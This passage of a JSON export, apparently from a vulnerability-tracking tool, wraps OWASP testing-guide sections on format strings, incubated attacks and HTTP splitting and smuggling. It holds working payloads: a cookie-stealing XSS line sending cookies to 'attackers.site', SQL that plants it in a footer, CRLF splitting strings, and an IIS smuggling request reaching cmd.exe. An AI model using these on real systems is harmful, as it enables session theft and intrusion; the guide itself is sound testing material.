memory\n\nThe following format string functions can cause runtime errors if the attacker adds conversion specifiers:\n\n* Java [String.format](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/String.html#format%28java.util.Locale%2Cjava.lang.String%2Cjava.lang.Object...%29) and [PrintStream.format](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/PrintStream.html#format%2528java.util.Locale%252Cjava.lang.String%252Cjava.lang.Object...%2529)\n* PHP [printf](https://www.php.net/manual/es/function.printf.php)\n\nThe code pattern that causes a format string vulnerability is a call to a string format function that contains unsanitized user input. The following example shows how a debug \u0060printf\u0060 could make a program vulnerable:\nThe example in C:\n\n\u0060\u0060\u0060\nchar *userName = /* input from user controlled field */;\n\nprintf(\u0022DEBUG Current user: \u0022);\n// Vulnerable debugging code\nprintf(userName);\n\u0060\u0060\u0060\n\nThe example in Java:\n\n\u0060\u0060\u0060\nfinal String userName = /* input from user controlled field */;\n\nSystem.out.printf(\u0022DEBUG Current user: \u0022);\n// Vulnerable code:\nSystem.out.printf(userName);\n\u0060\u0060\u0060\n\nIn this particular example, if the attacker set their \u0060userName\u0060 to have one or more conversion specifiers, there would be unwanted behavior. The C example would [print out memory contents](https://www.defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf) if \u0060userName\u0060 contained \u0060%p%p%p%p%p\u0060, and it can corrupt memory contents if there is a \u0060%n\u0060 in the string. In the Java example, a \u0060username\u0060 containing any specifier that needs an input (including \u0060%x\u0060 or \u0060%s\u0060) would cause the program to crash with \u0060IllegalFormatException\u0060. Although the examples are still subject to other problems, the vulnerability can be fixed by printf arguments of \u0060printf(\u0022DEBUG Current user: %s\u0022, userName)\u0060.","TestingInstructions":"## Test Objectives\n\n* Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application.\n\n## How to Test\n\nTests include analysis of the code and injecting conversion specifiers as user input to the application under test.\n\n### Static Analysis\n\nStatic analysis tools can find format string vulnerabilities in either the code or in binaries. Examples of tools include:\n\n* C and C\u002B\u002B: [Flawfinder](https://dwheeler.com/flawfinder/)\n* Java: FindSecurityBugs rule [FORMAT_STRING_MANIPULATION](https://find-sec-bugs.github.io/bugs.htm#FORMAT_STRING_MANIPULATION)\n* PHP: String formatter Analyzer in [phpsa](https://github.com/ovr/phpsa/blob/master/docs/05_Analyzers.md#function_string_formater)\n\n### Manual Code Inspection\n\nStatic analysis may miss more subtle cases including format strings generated by complex code. To look for vulnerabilities manually in a codebase, a tester can look for all calls in the codebase that accept a format string and trace back to make sure untrusted input cannot change the format string.\n\n### Conversion Specifier Injection\n\nTesters can check at the unit test or full system test level by sending conversion specifiers in any string input. [Fuzz](https://owasp.org/www-community/Fuzzing) the program using all of the conversion specifiers for all languages the system under test uses. See the [OWASP Format string attack](https://owasp.org/www-community/attacks/Format_string_attack) page for possible inputs to use. If the test fails, the program will crash or display an unexpected output. If the test passes, the attempt to send a conversion specifier should be blocked, or the string should go through the system with no issues as with any other valid input.\nThe examples in the following subsections have a URL of this form:\n\u0060https://vulnerable_host/userinfo?username=x\u0060\n\n* The user-controlled value is \u0060x\u0060 (for the \u0060username\u0060 parameter).\n\n#### Manual Injection\n\nTesters can perform a manual test using a web browser or other web API debugging tools. Browse to the web application or site such that the query has conversion specifiers. Note that most conversion specifiers need [encoding](https://tools.ietf.org/html/rfc3986#section-2.1) if sent inside a URL because they contain special characters including \u0060%\u0060 and \u0060{\u0060. The test can introduce a string of specifiers \u0060%s%s%s%n\u0060 by browsing with the following URL:\n\u0060https://vulnerable_host/userinfo?username=%25s%25s%25s%25n\u0060\nIf the web site is vulnerable, the browser or tool should receive an error, which may include a timeout or an HTTP return code 500.\nThe Java code returns the error\n\u0060java.util.MissingFormatArgumentException: Format specifier \u0027%s\u0027\u0060\nDepending on the C implementation, the process may crash completely with \u0060Segmentation Fault\u0060.\n\n#### Tool Assisted Fuzzing\n\nFuzzing tools including [wfuzz](https://github.com/xmendez/wfuzz) can automate injection tests. For wfuzz, start with a text file (fuzz.txt in this example) with one input per line:\nfuzz.txt:\n\n\u0060\u0060\u0060\nalice\n%s%s%s%n\n%p%p%p%p%p\n{event.__init__.__globals__[CONFIG][SECRET_KEY]}\n\u0060\u0060\u0060\n\nThe \u0060fuzz.txt\u0060 file contains the following:\n\n* A valid input \u0060alice\u0060 to verify the application can process a normal input\n* Two strings with C-like conversion specifiers\n* One Python conversion specifier to attempt to read global variables\n\nTo send the fuzzing input file to the web application under test, use the following command:\n\u0060wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ\u0060\nIn the above call, the \u0060urlencode\u0060 argument enables the appropriate escaping for the strings and \u0060FUZZ\u0060 (with the capital letters) tells the tool where to introduce the inputs.\nAn example output is as follows\n\n\u0060\u0060\u0060\nID           Response   Lines    Word     Chars       Payload\n===================================================================\n\n000000002:   500        0 L      5 W      142 Ch      \u0022%25s%25s%25s%25n\u0022\n000000003:   500        0 L      5 W      137 Ch      \u0022%25p%25p%25p%25p%25p\u0022\n000000004:   200        0 L      1 W      48 Ch       \u0022%7Bevent.__init__.__globals__%5BCONFIG%5D%5BSECRET_KEY%5D%7D\u0022\n000000001:   200        0 L      1 W      5 Ch        \u0022alice\u0022\n\u0060\u0060\u0060\n\nThe above result validates the application\u2019s weakness to the injection of C-like conversion specifiers \u0060%s\u0060 and \u0060%p\u0060.","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-14 Testing for Incubated Vulnerability","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nAlso often referred to as persistent attacks, incubated testing is a complex testing method that needs more than one data validation vulnerability to work. Incubated vulnerabilities are typically used to conduct \u201Cwatering hole\u201D attacks against users of legitimate web applications.\nIncubated vulnerabilities have the following characteristics:\n\n* The attack vector needs to be persisted in the first place, it needs to be stored in the persistence layer, and this would only occur if weak data validation was present or the data arrived into the system via another channel such as an admin console or directly via a backend batch process.\n* Secondly, once the attack vector was \u201Crecalled\u201D the vector would need to be executed successfully. For example, an incubated XSS attack would require weak output validation so the script would be delivered to the client in its executable form.\n\nExploitation of some vulnerabilities, or even functional features of a web application, will allow an attacker to plant a piece of data that will later be retrieved by an unsuspecting user or other component of the system, exploiting some vulnerability there.\nIn a penetration test, \u0060incubated attacks\u0060 can be used to assess the criticality of certain bugs, using the particular security issue found to build a client-side based attack that usually will be used to target a large number of victims at the same time (i.e. all users browsing the site).\nThis type of asynchronous attack covers a great spectrum of attack vectors, among them the following:\n\n* File upload components in a web application, allowing the attacker to upload corrupted media files (JPEG images exploiting \u0060CVE-2004-0200\u0060, PNG images exploiting \u0060CVE-2004-0597\u0060, executable files, site pages with active component, etc.)\n* Cross-site scripting issues in public forums posts (see [Testing for Stored Cross Site Scripting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting) for additional details). An attacker could potentially store malicious scripts or code in a repository in the backend of the web-application (e.g., a database) so that this script/code gets executed by one of the users (end users, administrators, etc). The archetypical incubated attack is exemplified by using a cross-site scripting vulnerability in a user forum, bulletin board, or blog in order to inject some JavaScript code at the vulnerable page, and will be eventually rendered and executed at the site user\u2019s browser \u2013using the trust level of the original (vulnerable) site at the user\u2019s browser.\n* SQL/XPATH Injection allowing the attacker to upload content to a database, which will be later retrieved as part of the active content in a web page. For example, if the attacker can post arbitrary JavaScript in a bulletin board so that it gets executed by users, then he might take control of their browsers (e.g., [XSS-proxy](http://sourceforge.net/projects/xss-proxy)).\n* Misconfigured servers allowing installation of Java packages or similar site components (i.e. Tomcat, or web hosting consoles such as Plesk, CPanel, Helm, etc.)","TestingInstructions":"## Test Objectives\n\n* Identify injections that are stored and require a recall step to the stored injection.\n* Understand how a recall step could occur.\n* Set listeners or activate the recall step if possible.\n\n## How to Test\n\n### Black-Box Testing\n\n#### File Upload Example\n\nVerify the content type allowed to upload to the web application and the resultant URL for the uploaded file. Upload a file that will exploit a component in the local user workstation when viewed or downloaded by the user. Send your victim an email or other kind of alert in order to lead him/her to browse the page. The expected result is the exploit will be triggered when the user browses the resultant page or downloads and executes the file from the trusted site.\n\n#### XSS Example on a Bulletin Board\n\n1. Introduce JavaScript code as the value for the vulnerable field, for instance \u0060\u003Cscript\u003Edocument.write(\u0027\u003Cimg\u00A0src=\u0022http://attackers.site/cv.jpg?\u0027\u002Bdocument.cookie\u002B\u0027\u0022\u003E\u0027)\u003C/script\u003E\u0060\n2. Direct users to browse the vulnerable page or wait for the users to browse it. Have a \u201Clistener\u201D at \u0060attackers.site\u0060 host listening for all incoming connections.\n3. When users browse the vulnerable page, a request containing their cookie (\u0060document.cookie\u0060 is included as part of the requested URL) will be sent to the \u0060attackers.site\u0060 host, such as: \u0060GET\u00A0/cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE;\u00A0HTTP/1.1\u0060\n4. Use cookies obtained to impersonate users at the vulnerable site.\n\n#### SQL Injection Example\n\nUsually, this set of examples leverages XSS attacks by exploiting a SQL-injection vulnerability. The first thing to test is whether the target site has a SQL injection vulnerability. This is described in [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection). For each SQL-injection vulnerability, there is an underlying set of constraints describing the kind of queries that the attacker/pen-tester is allowed to do.\nThe tester then has to match the XSS attacks he has devised with the entries that he is allowed to insert.\nIn a similar fashion as in the previous XSS example, use a web page field vulnerable to SQL injection issues to change a value in the database that would be used by the application as input to be shown at the site without proper filtering (this would be a combination of an SQL injection and a XSS issue). For instance, let\u2019s suppose there is a \u0060footer\u0060 table at the database with all footers for the site pages, including a \u0060notice\u0060 field with the legal notice that appears at the bottom of each web page. You could use the following query to inject JavaScript code to the \u0060notice\u0060 field at the \u0060footer\u0060 table in the database.\n\n\u0060\u0060\u0060\nSELECT\u00A0field1,\u00A0field2,\u00A0field3\nFROM\u00A0table_x\nWHERE\u00A0field2\u00A0=\u00A0\u0027x\u0027;\n\u00A0\u00A0\u00A0UPDATE\u00A0footer\n\u00A0\u00A0\u00A0SET\u00A0notice\u00A0=\u00A0\u0027Copyright\u00A01999-2030%20\n\u00A0\u00A0\u00A0\u00A0\u00A0\u00A0\u00A0\u003Cscript\u003Edocument.write(\\\u0027\u003Cimg\u00A0src=\u0022http://attackers.site/cv.jpg?\\\u0027\u002Bdocument.cookie\u002B\\\u0027\u0022\u003E\\\u0027)\u003C/script\u003E\u0027\n\u00A0\u00A0\u00A0WHERE\u00A0notice\u00A0=\u00A0\u0027Copyright\u00A01999-2030\u0027;\n\u0060\u0060\u0060\n\nNow, each user browsing the site will silently send their cookies to the \u0060attackers.site\u0060.\n\n#### Misconfigured Server\n\nSome web servers present an administration interface that may allow an attacker to upload active components of her choice to the site. This could be the case with an Apache Tomcat server that doesn\u2019t enforce strong credentials to access its Web Application Manager (or if the pen testers have been able to obtain valid credentials for the administration module by other means).\nIn this case, a WAR file can be uploaded and a new web application deployed at the site, which will not only allow the pen tester to execute code of her choice locally at the server, but also to plant an application at the trusted site, which the site regular users can then access (most probably with a higher degree of trust than when accessing a different site).\nAs should also be obvious, the ability to change web page contents at the server, via any vulnerabilities that may be exploitable at the host which will give the attacker webroot write permissions, will also be useful towards planting such an incubated attack on the web server pages (actually, this is a known infection-spread method for some web server worms).\n\n### Gray-Box Testing\n\nGray-box or white-box testing techniques will be the same as previously discussed.\n\n* Examining input validation is key in mitigating against this vulnerability. If other systems in the enterprise use the same persistence layer they may have weak input validation and the data may be persisted via a \u0060backdoor\u0060.\n* To combat the \u0060backdoor\u0060 issue for client-side attacks, output validation must also be employed so tainted data shall be encoded prior to displaying to the client, and hence not execute.\n\n## Tools\n\n* [XSS-proxy](https://sourceforge.net/projects/xss-proxy)\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n* [Burp Suite](https://portswigger.net/burp)\n* [Metasploit](https://www.metasploit.com/)\n\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\nMost of the references from the Cross-site scripting section are valid. As explained above, incubated attacks are executed when combining exploits such as XSS or SQL-injection attacks.\n\n### Advisories\n\n* [CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)\n* [Blackboard Academic Suite 6.2.23 \u002B/-: Persistent cross-site scripting vulnerability](https://cxsecurity.com/issue/WLB-2006080004)\n\n### Whitepapers\n\n* [Web Application Security Consortium \u201CThreat Classification, Cross-site scripting\u201D](http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-15 Testing for HTTP Splitting Smuggling","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThis section illustrates examples of attacks that leverage specific features of the HTTP protocol, either by exploiting weaknesses of the web application or peculiarities in the way different agents interpret HTTP messages. This section will analyze two different attacks that target specific HTTP headers:\n\n* HTTP splitting\n* HTTP smuggling\n\nThe first attack exploits a lack of input sanitization which allows an intruder to insert CR and LF characters into the headers of the application response and to \u2018split\u2019 that answer into two different HTTP messages. The goal of the attack can vary from a cache poisoning to cross site scripting.\nIn the second attack, the attacker exploits the fact that some specially crafted HTTP messages can be parsed and interpreted in different ways depending on the agent that receives them. HTTP smuggling requires some level of knowledge about the different agents that are handling the HTTP messages (web server, proxy, firewall) and therefore will be included only in the gray-box testing section.","TestingInstructions":"## Test Objectives\n\n* Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.\n* Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.\n\n## How to Test\n\n### Black-Box Testing\n\n#### HTTP Splitting\n\nSome web applications use part of the user input to generate the values of some headers of their responses. The most straightforward example is provided by redirections in which the target URL depends on some user-submitted value. Let\u2019s say for instance that the user is asked to choose whether they prefer a standard or advanced web interface. The choice will be passed as a parameter that will be used in the response header to trigger the redirection to the corresponding page.\nMore specifically, if the parameter \u2018interface\u2019 has the value \u2018advanced\u2019, the application will answer with the following:\n\n\u0060\u0060\u0060\nHTTP/1.1 302 Moved Temporarily\nDate: Sun, 03 Dec 2005 16:22:19 GMT\nLocation: http://victim.com/main.jsp?interface=advanced\n\u003Csnip\u003E\n\u0060\u0060\u0060\n\nWhen receiving this message, the browser will bring the user to the page indicated in the Location header. However, if the application does not filter the user input, it will be possible to insert in the \u2018interface\u2019 parameter the sequence %0d%0a, which represents the CRLF sequence that is used to separate different lines. At this point, testers will be able to trigger a response that will be interpreted as two different responses by anybody who happens to parse it, for instance a web cache sitting between us and the application. This can be leveraged by an attacker to poison this web cache so that it will provide false content in all subsequent requests.\nLet\u2019s say that in the previous example the tester passes the following data as the interface parameter:\n\u0060advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a\u003Chtml\u003ESorry,%20System%20Down\u003C/html\u003E\u0060\nThe resulting answer from the vulnerable application will therefore be the following:\n\n\u0060\u0060\u0060\nHTTP/1.1 302 Moved Temporarily\nDate: Sun, 03 Dec 2005 16:22:19 GMT\nLocation: http://victim.com/main.jsp?interface=advanced\nContent-Length: 0\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 35\n\n\u003Chtml\u003ESorry,%20System%20Down\u003C/html\u003E\n\u003Cother data\u003E\n\u0060\u0060\u0060\n\nThe web cache will see two different responses, so if the attacker sends, immediately after the first request, a second one asking for \u0060/index.html\u0060, the web cache will match this request with the second response and cache its content, so that all subsequent requests directed to \u0060victim.com/index.html\u0060 passing through that web cache will receive the \u201Csystem down\u201D message. In this way, an attacker would be able to effectively deface the site for all users using that web cache (the whole Internet, if the web cache is a reverse proxy for the web application).\nAlternatively, the attacker could pass to those users a JavaScript snippet that mounts a cross site scripting attack, e.g., to steal the cookies. Note that while the vulnerability is in the application, the target here is its users. Therefore, in order to look for this vulnerability, the tester needs to identify all user controlled input that influences one or more headers in the response, and check whether they can successfully inject a CR\u002BLF sequence in it.\nThe headers that are the most likely candidates for this attack are:\n\n* \u0060Location\u0060\n* \u0060Set-Cookie\u0060\n\nIt must be noted that a successful exploitation of this vulnerability in a real world scenario can be quite complex, as several factors must be taken into account:\n\n1. The pen-tester must properly set the headers in the fake response for it to be successfully cached (e.g., a Last-Modified header with a date set in the future). They might also have to destroy previously cached versions of the target pagers, by issuing a preliminary request with \u0060Pragma: no-cache\u0060 in the request headers\n2. The application, while not filtering the CR\u002BLF sequence, might filter other characters that are needed for a successful attack (e.g., \u0060\u003C\u0060 and \u0060\u003E\u0060). In this case, the tester can try to use other encodings (e.g., UTF-7)\n3. Some targets (e.g., ASP) will URL-encode the path part of the Location header (e.g., \u0060www.victim.com/redirect.asp\u0060), making a CRLF sequence useless. However, they fail to encode the query section (e.g., ?interface=advanced), meaning that a leading question mark is enough to bypass this filtering\n\nFor a more detailed discussion about this attack and other information about possible scenarios and applications, check the papers referenced at the bottom of this section.\n\n### Gray-Box Testing\n\n#### HTTP Splitting\n\nA successful exploitation of HTTP Splitting is greatly helped by knowing some details of the web application and of the attack target. For instance, different targets can use different methods to decide when the first HTTP message ends and when the second starts. Some will use the message boundaries, as in the previous example. Other targets will assume that different messages will be carried by different packets. Others will allocate for each message a number of chunks of predetermined length: in this case, the second message will have to start exactly at the beginning of a chunk and this will require the tester to use padding between the two messages. This might cause some trouble when the vulnerable parameter is to be sent in the URL, as a very long URL is likely to be truncated or filtered. A gray-box scenario can help the attacker to find a workaround: several application servers, for instance, will allow the request to be sent using POST instead of GET.\n\n#### HTTP Smuggling\n\nAs mentioned in the introduction, HTTP Smuggling leverages the different ways that a particularly crafted HTTP message can be parsed and interpreted by different agents (browsers, web caches, application firewalls). This relatively new kind of attack was first discovered by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin in 2005. There are several possible applications and we will analyze one of the most spectacular: the bypass of an application firewall. Refer to the original whitepaper (linked at the bottom of this page) for more detailed information and other scenarios.\n\n##### Application Firewall Bypass\n\nThere are several products that enable a system administration to detect and block a hostile web request depending on some known malicious pattern that is embedded in the request. For example, consider the infamous, old [Unicode directory traversal attack against IIS server](https://www.securityfocus.com/bid/1806), in which an attacker could break out the www root by issuing a request like:\n\u0060http://target/scripts/..%c1%1c../winnt/system32/cmd.exe?/c\u002B\u003Ccommand_to_execute\u003E\u0060\nOf course, it is quite easy to spot and filter this attack by the presence of strings like \u201C..\u201D and \u201Ccmd.exe\u201D in the URL. However, IIS 5.0 is quite picky about POST requests whose body is up to 48K bytes and truncates all content that is beyond this limit when the Content-Type header is different from application/x-www-form-urlencoded. The pen-tester can leverage this by creating a very large request, structured as follows:\n\n\u0060\u0060\u0060\nPOST /target.asp HTTP/1.1        \u003C-- Request #1\nHost: target\nConnection: Keep-Alive\nContent-Length: 49225\n\u003CCRLF\u003E\n\u003C49152 bytes of garbage\u003E\n\u0060\u0060\u0060\n\n\u0060\u0060\u0060\nPOST /target.asp HTTP/1.0        \u003C-- Request #2\nConnection: Keep-Alive\nContent-Length: 33\n\u003CCRLF\u003E\n\u0060\u0060\u0060\n\n\u0060\u0060\u0060\nPOST /target.asp HTTP/1.0        \u003C-- Request #3\nxxxx: POST /scripts/..%c1%1c../winnt/system32/cmd.exe?/c\u002Bdir HTTP/1.0   \u003C-- Request #4\nConnection: Keep-Alive\n\u003CCRLF\u003E\n\u0060\u0060\u0060\n\nWhat happens here is that the \u0060Request #1\u0060 is made of 49223 bytes, which includes also the lines of \u0060Request #2\u0060. Therefore, a firewall (or any other agent beside IIS 5.0) will see Request #1, will fail to see \u0060Request #2\u0060 (its data will be just part of #1), will see \u0060Request #3\u0060 and miss \u0060Request #4\u0060 (because the POST will be just part of the fake header xxxx).\nNow, what happens to IIS 5.0 ? It will stop parsing \u0060Request #1\u0060 right after the 49152 bytes of garbage (as it will have reached the 48K=49152 bytes limit) and will therefore parse \u0060Request #2\u0060 as a new, separate request. \u0060Request #2\u0060 claims that its content is 33 bytes, which includes everything until \u201Cxxxx: \u201C, making IIS miss \u0060Request #3\u0060 (interpreted as part of \u0060Request #2\u0060) but spot \u0060Request #4\u0060, as its POST starts right after the 33rd byte or \u0060Request #2\u0060. It is a bit complicated, but the point is that the attack URL will not be detected by the firewall (it will be interpreted as the body of a previous request) but will be correctly parsed (and executed) by IIS.\nWhile in the aforementioned case the technique exploits a bug of a web server, there are other scenarios in which we can leverage the different ways that different HTTP-enabled devices parse messages that are not 1005 RFC compliant. For instance, the HTTP protocol allows only one Content-Length header, but does not specify how to handle a message that has two instances of this header. Some implementations will use the first one while others will prefer the second, cleaning the way for HTTP Smuggling attacks. Another example is the use of the Content-Length header in a GET message.\nNote that HTTP Smuggling does \u0060*not*\u0060 exploit any vulnerability in the target web application. Therefore, it might be somewhat tricky, in a pen-test engagement, to convince the client that a countermeasure should be looked for anyway.\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":null,"References":"* [Amit Klein, \u201CDivide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics\u201D](https://packetstormsecurity.com/files/32815/Divide-and-Conquer-HTTP-Response-Splitting-Whitepaper.html)\n* [Amit Klein: \u201CHTTP Message Splitting, Smuggling and Other Animals\u201D](https://www.slideserve.com/alicia/http-message-splitting-smuggling-and-other-animals-powerpoint-ppt-presentation)\n* [Amit Klein: \u201CHTTP Request Smuggling - ERRATA (the IIS 48K buffer phenomenon)\u201D](https://www.securityfocus.com/archive/1/411418)\n* [Amit Klein: \u201CHTTP Response Smuggling\u201D](https://www.securityfocus.com/archive/1/425593)\n* [Chaim Linhart, Amit Klein, Ronen Heled, Steve Orrin: \u201CHTTP Request Smuggling\u201D](https://www.cgisecurity.com/lib/http-request-smuggling.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-16 Testing for HTTP Incoming Requests","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThis section describes how to monitor all incoming/outgoing HTTP requests on both client-side or server-side. The purpose of this testing is to verify if there is unnecessary or suspicious HTTP request sending in the background.\nMost of Web security testing tools (i.e. AppScan, BurpSuite, ZAP) act as HTTP Proxy. This will require changes of proxy on client-side application or browser. The testing techniques listed below is primary focused on how we can monitor HTTP requests without changes of client-side which will be more close to production usage scenario.","TestingInstructions":"## Test Objectives\n\n* Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.\n* Monitor HTTP traffic without changes of end user Browser proxy or client-side application.\n\n## How to Test\n\n### Reverse Proxy\n\nThere is situation that we would like to monitor all HTTP incoming requests on web server but we can\u2019t change configuration on the browser or application client-side. In this scenario, we can setup a reverse proxy on web server end to monitor all incoming/outgoing requests on web server.\nFor windows platform, Fiddler is recommended. It provides not only monitor but can also edit/reply the HTTP requests. Refer to [this reference for how to configure Fiddler as reverse Proxy](http://docs.telerik.com/fiddler/Configure-Fiddler/Tasks/UseFiddlerAsReverseProxy)\nFor Linux platform, Charles Web Debugging Proxy may be used.\nThe testing steps:\n\n1. Install Fiddler or Charles on Web Server\n2. Configure the Fiddler or Charles as Reverse Proxy\n3. Capture the HTTP traffic\n4. Inspect HTTP traffic\n5. Modify HTTP requests and replay the modified requests for testing\n\n### Port Forwarding\n\nPort forwarding is another way to allow us intercept HTTP requests without changes of client-side. You can also use Charles as a SOCKS proxy to act as port forwarding or uses of Port Forwarding tools. It will allow us to forward all coming client-side captured traffic to web server port.\nThe testing flow will be:\n\n1. Install the Charles or port forwarding on another machine or web Server\n2. Configure the Charles as Socks proxy as port forwarding.\n\n### TCP-level Network Traffic Capture\n\nThis technique monitor all the network traffic at TCP-level. TCPDump or WireShark tools can be used. However, these tools don\u2019t allow us edit the captured traffic and send modified HTTP requests for testing. To replay the captured traffic (PCAP) packets, Ostinato can be used.\nThe testing steps will be:\n\n1. Activate TCPDump or WireShark on Web Server to capture network traffic\n2. Monitor the captured files (PCAP)\n3. Edit PCAP files by Ostinato tool based on need\n4. Reply the HTTP requests\n\nFiddler or Charles are recommended since these tools can capture HTTP traffic and also easily edit/reply the modified HTTP requests. In addition, if the web traffic is HTTPS, the wireshark will need to import the web server private key to inspect the HTTPS message body. Otherwise, the HTTPS message body of the captured traffic will all be encrypted.\n\n## Tools\n\n* [Fiddler](https://www.telerik.com/fiddler/)\n* [TCPProxy](http://grinder.sourceforge.net/g3/tcpproxy.html)\n* [Charles Web Debugging Proxy](https://www.charlesproxy.com/)\n* [WireShark](https://www.wireshark.org/)\n* [PowerEdit-Pcap](https://sourceforge.net/projects/powereditpcap/)\n* [pcapteller](https://github.com/BlackArch/pcapteller)\n* [replayproxy](https://github.com/sparrowt/replayproxy)\n* [Ostinato](https://ostinato.org/)","Details":null,"Implication":null,"Recommendation":null,"References":"* [Charles Web Debugging Proxy](https://www.charlesproxy.com/)\n* [Fiddler](https://www.telerik.com/fiddler/)\n* [TCPDUMP](https://www.tcpdump.org/)\n* [Ostinato](https://ostinato.org/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation 